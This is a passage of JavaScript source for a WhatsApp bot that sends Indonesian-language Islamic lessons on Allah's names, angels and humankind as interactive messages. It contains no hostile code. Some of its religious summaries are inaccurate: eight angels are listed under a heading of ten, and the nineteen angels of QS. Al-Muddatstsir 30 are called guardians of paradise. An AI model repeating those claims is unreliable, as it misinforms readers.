┃51. Al-Haqq - Maha Benar
┃52. Al-Wakil - Maha Pemelihara
┃53. Al-Qawiy - Maha Kuat
┃54. Al-Matin - Maha Kokoh
┃55. Al-Waliy - Maha Pelindung
┃56. Al-Hamid - Maha Terpuji
┃57. Al-Muhshi - Maha Menghitung
┃58. Al-Mubdi' - Maha Memulai
┃59. Al-Mu'id - Maha Mengembalikan
┃60. Al-Muhyi - Maha Menghidupkan
┃61. Al-Mumit - Maha Mematikan
┃62. Al-Hayy - Maha Hidup
┃63. Al-Qayyum - Maha Berdiri Sendiri
┃64. Al-Wajid - Maha Menemukan
┃65. Al-Majid - Maha Mulia
┃66. Al-Wahid - Maha Esa
┃67. Al-Ahad - Maha Tunggal
┃68. As-Shamad - Maha Dibutuhkan
┃69. Al-Qadir - Maha Kuasa
┃70. Al-Muqtadir - Maha Berkuasa
┃71. Al-Muqaddim - Maha Mendahulukan
┃72. Al-Mu'akhkhir - Maha Mengakhirkan
┃73. Al-Awwal - Maha Awal
┃74. Al-Akhir - Maha Akhir
┃75. Azh-Zhahir - Maha Nyata
┃76. Al-Bathin - Maha Tersembunyi
┃77. Al-Wali - Maha Memerintah
┃78. Al-Muta'ali - Maha Tinggi
┃79. Al-Barr - Maha Dermawan
┃80. At-Tawwab - Maha Penerima Taubat
┃81. Al-Muntaqim - Maha Penyiksa
┃82. Al-Afuww - Maha Pemaaf
┃83. Ar-Ra'uf - Maha Pengasih
┃84. Malikul Mulk - Pemilik Kerajaan
┃85. Dzul Jalali wal Ikram - Pemilik Keagungan dan Kemuliaan
┃86. Al-Muqsith - Maha Adil
┃87. Al-Jami' - Maha Mengumpulkan
┃88. Al-Ghaniy - Maha Kaya
┃89. Al-Mughni - Maha Pemberi Kekayaan
┃90. Al-Mani' - Maha Mencegah
┃91. Adh-Dharr - Maha Pemberi Mudharat
┃92. An-Nafi' - Maha Pemberi Manfaat
┃93. An-Nur - Maha Pemberi Cahaya
┃94. Al-Hadi - Maha Pemberi Petunjuk
┃95. Al-Badi' - Maha Pencipta yang Tiada Tandingan
┃96. Al-Baqi - Maha Kekal
┃97. Al-Warits - Maha Pewaris
┃98. Ar-Rasyid - Maha Pandai
┃99. As-Shabur - Maha Sabar
┗━━━━━━━━━━
⌲ \`𝐒𝐈𝐅𝐀𝐓 𝐀𝐋𝐀𝐇 𝐘𝐀𝐍𝐆 𝐖𝐀𝐉𝐈𝐁 𝐃𝐈𝐊𝐄𝐓𝐀𝐇𝐔𝐈\`
20 sifat wajib Allah:
┏━━━━━━━━
┃1. Wujud - Ada
┃2. Qidam - Terdahulu tanpa awal
┃3. Baqa' - Kekal tanpa akhir
┃4. Mukhalafatu lil Hawadits - Berbeda dengan makhluk
┃5. Qiyamuhu binafsih - Berdiri sendiri
┃6. Wahdaniyyah - Esa
┃7. Qudrah - Kuasa
┃8. Iradah - Berkehendak
┃9. Ilmu - Mengetahui
┃10. Hayat - Hidup
┃11. Sama' - Mendengar
┃12. Bashar - Melihat
┃13. Kalam - Berfirman
┃14. Qadiran - Maha Kuasa
┃15. Muridan - Maha Berkehendak
┃16. Aliman - Maha Mengetahui
┃17. Hayyan - Maha Hidup
┃18. Sami'an - Maha Mendengar
┃19. Bashiran - Maha Melihat
┃20. Mutakalliman - Maha Berfirman
┗━━━━━━━━━━
⌲ \`𝐇𝐀𝐊 𝐀𝐋𝐀𝐇 𝐀𝐓𝐀𝐒 𝐇𝐀𝐌𝐁𝐀𝐍𝐘𝐀\`
┏━━━━━━━━
┃1. *Diibadahi saja* - Tidak menyekutukan-Nya
┃2. *Bersyukur atas nikmat* - Syukur dengan hati, lisan, anggota badan
┃3. *Tawakal* - Bersandar hanya kepada Allah setelah berusaha
┃4. *Takut dan harap* - Takut azab-Nya, harap rahmat-Nya
┃5. *Cinta kepada Allah* - Di atas cinta kepada selain-Nya
┃6. *Taat kepada perintah-Nya* - Sholat, puasa, zakat, haji, berbakti orang tua
┗━━━━━━━━━━
⌲ \`𝐍𝐈𝐊𝐌𝐀𝐓 & 𝐊𝐄𝐁𝐄𝐒𝐀𝐑𝐀𝐍 𝐀𝐋𝐀𝐇\`
┏━━━━━━━━
┃1. Menciptakan manusia dari setetes mani
┃2. Menjadikan malam untuk istirahat, siang untuk mencari rezeki
┃3. Menurunkan hujan, menumbuhkan tanaman, mengalirkan sungai
┃4. Menundukkan matahari, bulan, bintang untuk manusia
┃5. Memberi pendengaran, penglihatan, akal, hati
┃6. Mengampuni dosa hamba yang bertaubat walau sebanyak buih di lautan
┗━━━━━━━━━━
⌲ \`𝐘𝐀𝐍𝐆 𝐌𝐄𝐌𝐁𝐀𝐓𝐀𝐋𝐊𝐀𝐍 𝐓𝐀𝐔𝐇𝐈𝐃\`
┏━━━━━━━━
┃1. *Syirik Akbar* - Menyembah selain Allah, minta tolong ke kuburan, dukun
┃2. *Syirik Asghar* - Riya, sum'ah, bersumpah selain Allah
┃3. *Kufur Akbar* - Mendustakan Allah, Rasul, Al-Quran
┃4. *Nifaq Akbar* - Menampakkan Islam tapi menyembunyikan kekufuran
┃5. *Bid'ah* - Membuat ibadah baru yang tidak ada contoh dari Nabi ﷺ
┗━━━━━━━━━━
⌲ \`𝐀𝐌𝐀𝐋𝐀𝐍 𝐔𝐍𝐓𝐔𝐊 𝐌𝐄𝐍𝐃𝐄𝐊𝐀𝐓𝐊𝐀𝐍 𝐃𝐈𝐑𝐈 𝐊𝐄𝐏𝐀𝐃𝐀 𝐀𝐋𝐀𝐇\`
┏━━━━━━━━
┃1. *Dzikir* - Subhanallah, Alhamdulillah, Allahu Akbar, La ilaha illallah
┃2. *Doa* - Berdoa di waktu mustajab: sepertiga malam, antara adzan iqamah
┃3. *Tilawah Al-Quran* - Membaca dan mentadabburi maknanya
┃4. *Tafakkur* - Memikirkan ciptaan Allah di langit dan bumi
┃5. *Istighfar* - Minta ampun 100x sehari seperti Nabi ﷺ
┃6. *Sholat Sunnah* - Rawatib, tahajjud, dhuha
┗━━━━━━━━━━
⌲ \`𝐀𝐘𝐀𝐓 𝐊𝐔𝐑𝐒𝐈 & 𝐀𝐘𝐀𝐓 𝐓𝐄𝐍𝐓𝐀𝐍𝐆 𝐀𝐋𝐀𝐇\`
"Allah, tidak ada Tuhan selain Dia Yang Hidup kekal lagi terus menerus mengurus makhluk-Nya. 
Tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi..." 
QS. Al-Baqarah 255

"Dialah Allah Yang tiada Tuhan selain Dia, Raja, Yang Maha Suci, Yang Maha Sejahtera..." 
QS. Al-Hasyr 23-24

⌲ \`𝐏𝐄𝐍𝐔𝐓𝐔𝐏\`
Allah ﷻ berfirman: 
"Aku sesuai persangkaan hamba-Ku kepada-Ku. Jika ia mengingat-Ku, Aku bersamanya." HR. Bukhari Muslim

Kenali Allah melalui nama, sifat, dan ciptaan-Nya. 
Semakin kenal, semakin cinta. Semakin cinta, semakin taat.

"Ya Allah, aku memohon kepada-Mu dengan seluruh nama-Mu yang Engkau namakan diri-Mu dengannya, 
atau yang Engkau ajarkan kepada salah satu makhluk-Mu, atau yang Engkau turunkan dalam kitab-Mu..."
\`[☝️] 𝐋𝐀 𝐈𝐋𝐀𝐇𝐀 𝐈𝐋𝐀𝐋𝐀𝐇 [☝️]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778781922256.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐒𝐌𝐀𝐔𝐋 𝐇𝐔𝐒𝐍𝐀',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐋𝐀𝐇",
 url: `https://quran.com`,
 copy_code: "SUBHANALLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9],
 list_title: "CLICK",
 button_title: "© TENTANG ALLAH"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© TENTANG ALLAH",
 sections: [{
 title: "Bab Tauhid",
 highlight_label: "𝐊𝐄𝐍𝐀𝐋𝐈 𝐀𝐋𝐀𝐇 🚀",
 rows: [
 { title: "𝐓𝐚𝐮𝐡𝐢𝐝 3 𝐌𝐚𝐜𝐚𝐦", description: "𝐑𝐮𝐛𝐮𝐛𝐢𝐲𝐚𝐡, 𝐔𝐥𝐮𝐡𝐢𝐲𝐚𝐡, 𝐀𝐬𝐦𝐚 𝐰𝐚 𝐒𝐢𝐟𝐚𝐭", id: `${prefix}allah` },
 { title: "𝐀𝐬𝐦𝐚𝐮𝐥 𝐇𝐮𝐬𝐧𝐚 99", description: "𝐍𝐚𝐦𝐚-𝐧𝐚𝐦𝐚 𝐀𝐥𝐚𝐡 𝐲𝐚𝐧𝐠 𝐢𝐧𝐝𝐚𝐡", id: `${prefix}allah` },
 { title: "𝐒𝐢𝐟𝐚𝐭 𝐖𝐚𝐣𝐢𝐛 20", description: "𝐒𝐢𝐟𝐚𝐭 𝐲𝐚𝐧𝐠 𝐰𝐚𝐣𝐢𝐛 𝐛𝐚𝐠𝐢 𝐀𝐥𝐚𝐡", id: `${prefix}allah` },
 { title: "𝐇𝐚𝐤 𝐀𝐥𝐚𝐡 𝐚𝐭𝐚𝐬 𝐇𝐚𝐦𝐛𝐚", description: "𝐀𝐩𝐚 𝐲𝐚𝐧𝐠 𝐡𝐚𝐫𝐮𝐬 𝐤𝐢𝐭𝐚 𝐥𝐚𝐤𝐮𝐤𝐚𝐧", id: `${prefix}allah` },
 { title: "𝐍𝐢𝐤𝐦𝐚𝐭 𝐀𝐥𝐚𝐡", description: "𝐁𝐞𝐬𝐚𝐫𝐧𝐲𝐚 𝐧𝐢𝐤𝐦𝐚𝐭 𝐲𝐚𝐧𝐠 𝐝𝐢𝐛𝐞𝐫𝐢", id: `${prefix}allah` },
 { title: "𝐘𝐚𝐧𝐠 𝐌𝐞𝐦𝐛𝐚𝐭𝐚𝐥𝐤𝐚𝐧", description: "𝐒𝐲𝐢𝐫𝐢𝐤, 𝐤𝐮𝐟𝐮𝐫, 𝐛𝐢𝐝'𝐚𝐡", id: `${prefix}allah` },
 { title: "𝐀𝐦𝐚𝐥𝐚𝐧 𝐌𝐞𝐧𝐝𝐞𝐤𝐚𝐭", description: "𝐂𝐚𝐫𝐚 𝐝𝐞𝐤𝐚𝐭 𝐤𝐞𝐩𝐚𝐝𝐚 𝐀𝐥𝐚𝐡", id: `${prefix}allah` },
 { title: "𝐀𝐲𝐚𝐭 𝐊𝐮𝐫𝐬𝐢", description: "𝐀𝐲𝐚𝐭 𝐚𝐠𝐮𝐧𝐠 𝐭𝐞𝐧𝐭𝐚𝐧𝐠 𝐀𝐥𝐚𝐡", id: `${prefix}allah` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kcwa.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'malaikat':
case 'angel':
case 'malaikatallah': {
 await Asepp.sendMessage(m.chat, { react: { text: "👼", key: m.key } })

 let teks = `\`𝗦𝗘𝗠𝗨𝗔 𝗧𝗘𝗡𝗧𝗔𝗡𝗚 𝗠𝗔𝗟𝗔𝗜𝗞𝗔𝗧\`

Assalamualaikum \`${pushname}\` 👋 Ini rangkuman lengkap tentang malaikat, makhluk Allah yang diciptakan dari cahaya.

⌲ \`𝐇𝐀𝐊𝐈𝐊𝐀𝐓 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓\`
┏━━━━━━━━
┃1. *Diciptakan dari cahaya* - HR. Muslim: "Malaikat diciptakan dari cahaya"
┃2. *Tidak punya hawa nafsu* - Selalu taat, tidak pernah maksiat
┃3. *Tidak makan, minum, tidur, menikah* - Tidak butuh apa-apa
┃4. *Bisa berubah bentuk* - Bisa menyerupai manusia dengan izin Allah
┃5. *Sangat kuat* - Malaikat Jibril bisa mengangkat kota kaum Luth
┗━━━━━━━━━━
⌲ \`𝐈𝐌𝐀𝐍 𝐊𝐄𝐏𝐀𝐃𝐀 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓\`
Rukun iman ke-2. Wajib meyakini keberadaan mereka walau tidak terlihat.
┏━━━━━━━━
┃1. Percaya jumlahnya banyak, hanya Allah yang tahu
┃2. Percaya mereka punya tugas masing-masing dari Allah
┃3. Percaya mereka selalu bertasbih siang malam tanpa henti
┃4. Dalil: "Dan malaikat-malaikat bertasbih dengan memuji Tuhannya" QS. Asy-Syura 5
┗━━━━━━━━━━
⌲ \`𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓 𝐘𝐀𝐍𝐆 𝐖𝐀𝐉𝐈𝐁 𝐃𝐈𝐊𝐄𝐓𝐀𝐇𝐔𝐈\`
10 malaikat utama dan tugasnya:
┏━━━━━━━━
┃1. *Jibril* - Menyampaikan wahyu kepada para nabi dan rasul
┃2. *Mikail* - Membagikan rezeki dan mengatur hujan, angin
┃3. *Israfil* - Meniup sangkakala tanda kiamat
┃4. *Izrail* - Mencabut nyawa, disebut Malaikat Maut
┃5. *Munkar & Nakir* - Menanya di alam kubur
┃6. *Raqib & Atid* - Mencatat amal baik dan buruk manusia
┃7. *Malik* - Penjaga pintu neraka
┃8. *Ridwan* - Penjaga pintu surga
┗━━━━━━━━━━
⌲ \`𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓 𝐋𝐀𝐈𝐍 𝐘𝐀𝐍𝐆 𝐃𝐈𝐒𝐄𝐁𝐔𝐓𝐊𝐀𝐍\`
┏━━━━━━━━
┃1. *Hamalat Al-Arsy* - 8 malaikat pemikul Arsy Allah
┃2. *Malaikat Penjaga Manusia* - Menjaga manusia dari bahaya dengan izin Allah
┃3. *Malaikat Rahmat* - Turun saat majelis dzikir, membaca Al-Quran
┃4. *Malaikat Azab* - Diutus untuk menghukum kaum yang durhaka
┃5. *Malaikat Pencatat Takdir* - Mencatat takdir janin di rahim ibu
┃6. *Malaikat Penjaga Surga* - Jumlahnya 19, QS. Al-Muddatstsir 30
┗━━━━━━━━━━
⌲ \`𝐓𝐔𝐆𝐀𝐒 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓 𝐒𝐄𝐇𝐀𝐑𝐈-𝐇𝐀𝐑𝐈\`
┏━━━━━━━━
┃1. *Mencatat amal* - Setiap ucapan dan perbuatan manusia dicatat
┃2. *Mendoakan manusia* - Mendoakan orang yang berinfak, yang sholat di shaf pertama
┃3. *Menjaga manusia* - Menjaga dari bahaya kecuali yang sudah ditakdirkan
┃4. *Mencabut nyawa* - Dengan lembut untuk orang beriman, keras untuk kafir
┃5. *Menanya di kubur* - "Siapa Tuhanmu? Siapa Nabimu? Apa agamamu?"
┃6. *Membawa ruh ke langit* - Untuk orang beriman, ruh naik ke langit ke-7
┗━━━━━━━━━━
⌲ \`𝐒𝐈𝐅𝐀𝐓 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓\`
┏━━━━━━━━
┃1. *Taat mutlak* - "Mereka tidak mendurhakai Allah terhadap apa yang diperintahkan-Nya" QS. At-Tahrim 6
┃2. *Tidak lelah beribadah* - "Mereka bertasbih malam dan siang tiada henti-hentinya" QS. Al-Anbiya 20
┃3. *Takut kepada Allah* - "Mereka takut kepada Tuhan mereka yang di atas mereka" QS. An-Nahl 50
┃4. *Tidak makan minum* - Ketika tamu Ibrahim AS tidak mau makan
┃5. *Bisa terbang* - Punya sayap 2, 3, 4 atau lebih
┗━━━━━━━━━━
⌲ \`𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓 𝐃𝐀𝐍 𝐌𝐀𝐍𝐔𝐒𝐈𝐀\`
┏━━━━━━━━
┃1. *Malaikat hadir di majelis ilmu* - Membentangkan sayap untuk penuntut ilmu
┃2. *Malaikat mendoakan orang yang berinfak* - "Ya Allah berilah ganti kepada orang yang berinfak"
┃3. *Malaikat hadir saat adzan dan iqamah* - Makanya disunnahkan menjawab adzan
┃4. *Malaikat menjauhi orang yang makan bawang mentah* - Karena bau mulutnya
┃5. *Malaikat tidak masuk rumah yang ada anjing dan gambar makhluk bernyawa*
┗━━━━━━━━━━
⌲ \`𝐘𝐀𝐍𝐆 𝐌𝐄𝐍𝐘𝐀𝐊𝐈𝐓𝐈 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓\`
Hal-hal yang membuat malaikat pergi dari kita:
┏━━━━━━━━
┃1. Rumah yang ada gambar makhluk bernyawa dan patung
┃2. Rumah yang ada anjing
┃3. Orang yang makan makanan berbau tajam lalu sholat berjamaah
┃4. Orang yang junub dan tidak segera mandi
┃5. Orang yang berkata kotor, ghibah, namimah
┗━━━━━━━━━━
⌲ \`𝐊𝐈𝐒𝐀𝐇 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓 𝐃𝐀𝐋𝐀𝐌 𝐀𝐋-𝐐𝐔𝐑𝐀𝐍\`
┏━━━━━━━━
┃1. *Jibril menemui Maryam* - Menyampaikan kabar kelahiran Isa AS
┃2. *Malaikat mengunjungi Ibrahim AS* - Membawa kabar kelahiran Ishaq dan kehancuran kaum Luth
┃3. *Malaikat membantu perang Badar* - 1000 malaikat turun membantu kaum muslimin
┃4. *Malaikat mencabut nyawa Fir'aun* - Saat tenggelam di laut
┃5. *Malaikat Harut dan Marut* - Di Babilon, menguji manusia tentang sihir
┗━━━━━━━━━━
⌲ \`𝐀𝐃𝐀𝐁 𝐊𝐈𝐓𝐀 𝐊𝐄𝐏𝐀𝐃𝐀 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓\`
┏━━━━━━━━
┃1. Beriman bahwa mereka ada dan selalu mengawasi kita
┃2. Tidak mencela atau menghina malaikat
┃3. Meminta perlindungan Allah dari gangguan setan
┃4. Menjaga rumah dari hal yang membuat malaikat pergi
┃5. Banyak berdzikir agar malaikat rahmat hadir
┗━━━━━━━━━━
⌲ \`𝐏𝐄𝐍𝐔𝐓𝐔𝐏\`
Malaikat itu makhluk mulia yang selalu taat. 
Mereka mencatat amal kita setiap hari, baik yang baik maupun buruk.

"Ingatlah, kamu dicatat oleh dua malaikat yang mulia, yang mengetahui apa yang kamu kerjakan." 
QS. Al-Infithar 10-12

Semoga kita jadi orang yang amalannya membuat malaikat mendoakan kita, 
bukan amalannya membuat malaikat menjauhi kita.

\`[👼] 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓 𝐒𝐄𝐋𝐀𝐋𝐔 𝐌𝐄𝐍𝐆𝐀𝐖𝐀𝐒𝐈 [👼]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓 𝐀𝐋𝐀𝐇',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓",
 url: `https://quran.com`,
 copy_code: "SUBHANALLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0, 1, 2, 3, 4, 5, 6, 7, 8],
 list_title: "CLICK",
 button_title: "© MATERI MALAIKAT"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© MATERI MALAIKAT",
 sections: [{
 title: "Bab Malaikat",
 highlight_label: "𝐁𝐄𝐋𝐀𝐉𝐀𝐑 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓 🚀",
 rows: [
 { title: "𝐇𝐚𝐤𝐢𝐤𝐚𝐭 𝐌𝐚𝐥𝐚𝐢𝐤𝐚𝐭", description: "𝐒𝐢𝐚𝐩𝐚 𝐝𝐚𝐧 𝐝𝐚𝐫𝐢 𝐚𝐩𝐚 𝐝𝐢𝐜𝐢𝐩𝐭𝐚𝐤𝐚𝐧", id: `${prefix}malaikat` },
 { title: "𝐍𝐚𝐦𝐚 & 𝐓𝐮𝐠𝐚𝐬", description: "𝐉𝐢𝐛𝐫𝐢𝐥, 𝐌𝐢𝐤𝐚𝐢𝐥, 𝐈𝐬𝐫𝐚𝐟𝐢𝐥, 𝐝𝐥", id: `${prefix}malaikat` },
 { title: "𝐒𝐢𝐟𝐚𝐭 𝐌𝐚𝐥𝐚𝐢𝐤𝐚𝐭", description: "𝐓𝐚𝐭, 𝐭𝐢𝐝𝐚𝐤 𝐛𝐞𝐫𝐧𝐚𝐟𝐬𝐮, 𝐤𝐮𝐚𝐭", id: `${prefix}malaikat` },
 { title: "𝐓𝐮𝐠𝐚𝐬 𝐒𝐞𝐡𝐚𝐫𝐢-𝐡𝐚𝐫𝐢", description: "𝐂𝐚𝐭𝐚𝐭 𝐚𝐦𝐚𝐥, 𝐜𝐚𝐛𝐮𝐭 𝐧𝐲𝐚𝐰𝐚, 𝐝𝐨𝐚𝐤𝐚𝐧", id: `${prefix}malaikat` },
 { title: "𝐌𝐚𝐥𝐚𝐢𝐤𝐚𝐭 & 𝐌𝐚𝐧𝐮𝐬𝐢𝐚", description: "𝐇𝐮𝐛𝐮𝐧𝐠𝐚𝐧 𝐤𝐢𝐭𝐚 𝐝𝐞𝐧𝐠𝐚𝐧 𝐦𝐞𝐫𝐞𝐤𝐚", id: `${prefix}malaikat` },
 { title: "𝐘𝐚𝐧𝐠 𝐌𝐞𝐧𝐲𝐚𝐤𝐢𝐭𝐢", description: "𝐇𝐚𝐥 𝐲𝐚𝐧𝐠 𝐛𝐢𝐤𝐢𝐧 𝐦𝐚𝐥𝐚𝐢𝐤𝐚𝐭 𝐩𝐞𝐫𝐠𝐢", id: `${prefix}malaikat` },
 { title: "𝐊𝐢𝐬𝐚𝐡 𝐝𝐚𝐥𝐚𝐦 𝐐𝐮𝐫𝐚𝐧", description: "𝐌𝐚𝐥𝐚𝐢𝐤𝐚𝐭 𝐝𝐢 𝐳𝐚𝐦𝐚𝐧 𝐩𝐚𝐫𝐚 𝐧𝐚𝐛𝐢", id: `${prefix}malaikat` },
 { title: "𝐀𝐝𝐚𝐛 𝐤𝐞𝐩𝐚𝐝𝐚 𝐌𝐚𝐥𝐚𝐢𝐤𝐚𝐭", description: "𝐂𝐚𝐫𝐚 𝐛𝐞𝐫𝐚𝐝𝐚𝐛 𝐤𝐞𝐩𝐚𝐝𝐚 𝐦𝐞𝐫𝐞𝐤𝐚", id: `${prefix}malaikat` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'manusia':
case 'manusiaallah':
case 'hakikatmanusia': {
 await Asepp.sendMessage(m.chat, { react: { text: "👤", key: m.key } })

 let teks = `\`𝗠𝗔𝗡𝗨𝗦𝗜𝗔, 𝗧𝗨𝗛𝗔𝗡, 𝗡𝗔𝗕𝗜, 𝗥𝗔𝗦𝗨𝗟, 𝗠𝗔𝗟𝗔𝗜𝗞𝗔𝗧\`

Assalamualaikum \`${pushname}\` 👋 Ini penjelasan biar gak bingung bedain kedudukan Allah, Nabi, Rasul, Malaikat, dan Manusia.

⌲ \`𝐀𝐋𝐀𝐇 ﷻ - 𝐏𝐄𝐍𝐂𝐈𝐏𝐓𝐀\`
┏━━━━━━━━
┃1. *Kedudukan* - Tuhan, Pencipta, Pengatur, Pemilik seluruh alam semesta
┃2. *Sifat* - Maha Sempurna, tidak butuh makan minum tidur, tidak beranak dan diperanakkan
┃3. *Kuasa* - Maha Kuasa atas segala sesuatu. "Kun fayakun" jadi maka jadi
┃4. *Hubungan dengan manusia* - Kita hamba-Nya, wajib menyembah dan taat
┃5. *Fakta* - Tidak bisa dilihat di dunia, hanya bisa dilihat di surga bagi orang beriman
┗━━━━━━━━━━
⌲ \`𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓 - 𝐌𝐀𝐊𝐇𝐋𝐔𝐊 𝐂𝐀𝐇𝐀𝐘𝐀\`
┏━━━━━━━━
┃1. *Kedudukan* - Hamba Allah yang mulia, diciptakan dari cahaya
┃2. *Sifat* - Tidak punya nafsu, selalu taat, tidak pernah maksiat
┃3. *Tugas* - Menyampaikan wahyu, mencatat amal, mencabut nyawa, menjaga manusia
┃4. *Hubungan dengan manusia* - Mencatat amal kita, mendoakan orang beriman
┃5. *Fakta* - Bisa berubah bentuk jadi manusia, punya sayap 2-4 atau lebih
┃6. *Beda dengan manusia* - Tidak punya nafsu, tidak bisa maksiat, tidak butuh makan
┗━━━━━━━━━━
⌲ \`𝐍𝐀𝐁𝐈 & 𝐑𝐀𝐒𝐔𝐋 - 𝐌𝐀𝐍𝐔𝐒𝐈𝐀 𝐏𝐈𝐋𝐈𝐇𝐀𝐍\`
┏━━━━━━━━
┃*Nabi* - Manusia yang diberi wahyu untuk dirinya sendiri
┃*Rasul* - Nabi yang diberi wahyu dan diperintahkan menyampaikan ke umatnya

┏━━━━━━━━
┃1. *Kedudukan* - Manusia biasa, tapi dipilih Allah jadi utusan
┃2. *Sifat* - Punya nafsu, makan, minum, tidur, menikah, sakit, mati seperti manusia
┃3. *Maksum* - Terjaga dari dosa besar dan kecil yang merusak risalah
┃4. *Tugas* - Menyampaikan wahyu, memberi contoh, mendidik umat
┃5. *Jumlah* - 124.000 nabi, 313 rasul. 25 yang wajib diketahui
┃6. *Fakta* - Nabi Muhammad ﷺ penutup para nabi. Tidak ada nabi setelah beliau
┗━━━━━━━━━━
⌲ \`𝐌𝐀𝐍𝐔𝐒𝐈𝐀 - 𝐌𝐀𝐊𝐇𝐋𝐔𝐊 𝐘𝐀𝐍𝐆 𝐃𝐈𝐔𝐉𝐈\`
┏━━━━━━━━
┃1. *Kedudukan* - Khalifah di bumi, makhluk yang diberi akal dan nafsu
┃2. *Asal* - Diciptakan dari tanah, air mani, darah, daging
┃3. *Sifat* - Punya akal, nafsu, bisa taat bisa maksiat, bisa taubat
┃4. *Tujuan hidup* - Beribadah kepada Allah QS. Adz-Dzariyat 56
┃5. *Fakta* - Umur rata-rata 60-70 tahun. Setelah mati masuk alam barzakh
┗━━━━━━━━━━
⌲ \`𝐏𝐄𝐑𝐁𝐄𝐃𝐀𝐍 𝐔𝐓𝐀𝐌𝐀\`
┏━━━━━━━━
┃*Allah* - Pencipta, tidak diciptakan, tidak butuh apapun
┃*Malaikat* - Ciptaan dari cahaya, tidak punya nafsu, selalu taat
┃*Nabi/Rasul* - Manusia pilihan, punya nafsu tapi maksum, pembawa wahyu
┃*Manusia Biasa* - Ciptaan dari tanah, punya nafsu, bisa taat bisa maksiat
┗━━━━━━━━━━
⌲ \`𝐅𝐀𝐊𝐓𝐀 𝐓𝐄𝐍𝐓𝐀𝐍𝐆 𝐌𝐀𝐍𝐔𝐒𝐈𝐀\`
┏━━━━━━━━
┃1. *Kejadian manusia* - Dari setetes mani yang hina, lalu jadi segumpal darah
┃2. *Akal dan nafsu* - Bedanya manusia dengan hewan dan malaikat
┃3. *Ujian hidup* - Hidup itu ujian. Kaya, miskin, sehat, sakit semua ujian
┃4. *Kematian pasti* - "Tiap yang bernyawa pasti mati" QS. Ali Imran 185
┃5. *Alam barzakh* - Alam antara dunia dan akhirat. Ada nikmat kubur dan azab kubur
┃6. *Hari kebangkitan* - Semua manusia dibangkitkan untuk dihisab
┗━━━━━━━━━━
⌲ \`𝐊𝐄𝐋𝐄𝐁𝐈𝐇𝐀𝐍 𝐌𝐀𝐍𝐔𝐒𝐈𝐀 𝐃𝐀𝐑𝐈 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓\`
Walau malaikat lebih mulia dalam ketaatan, manusia punya keistimewaan:
┏━━━━━━━━
┃1. *Punya akal dan nafsu* - Bisa melawan hawa nafsu demi taat. Itu lebih berat
┃2. *Bisa bertaubat* - Dosa besar pun diampuni kalau taubat nasuha
┃3. *Bisa jadi lebih mulia dari malaikat* - Kalau ilmunya, takwanya tinggi
